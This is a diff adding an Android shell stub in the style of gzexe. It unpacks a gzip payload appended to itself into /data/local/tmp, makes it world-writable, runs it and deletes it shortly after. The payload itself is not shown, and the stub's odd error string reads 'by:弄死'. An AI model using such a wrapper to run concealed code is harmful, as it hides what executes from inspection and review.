@@ -1,0 +1,43 @@
+#!/system/bin/sh
+CRC32=44
+set -e
+tab='	'
+nl='
+'
+IFS=" $tab$nl"
+umask=`umask`
+umask 77
+gztmpdir=
+trap 'res=$?
+  test -n "$gztmpdir" && rm -fr "$gztmpdir"
+  (exit $res); exit $res
+' 0 1 2 3 5 10 13 15
+case $TMPDIR in
+  / | /*/) ;;
+  /*) TMPDIR=$TMPDIR/;;
+  *) TMPDIR=/data/local/tmp/;;
+esac
+if type mktemp >/dev/null 2>&1; then
+  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
+else
+  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
+fi || { (exit 256); exit 256; }
+gztmp=$gztmpdir/$0
+case $0 in
+-* | */*'
+') mkdir -p "$gztmp" && rm -r "$gztmp";;
+*/*) gztmp=$gztmpdir/`basename "$0"`;;
+esac || { (exit 256); exit 256; }
+case `printf 'X\n' | tail -n +1 2>/dev/null` in
+X) tail_n=-n;;
+*) tail_n=;;
+esac
+if tail $tail_n +44 <"$0" | gzip -cd > "$gztmp"; then
+  umask $umask
+  chmod 777 "$gztmp"
+  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
+  "$gztmp" ${1+"$@"}; res=$?
+else
+  printf >&2 '%s\n' " by:弄死 $0"
+  (exit 256); res=256
+fi; exit $res
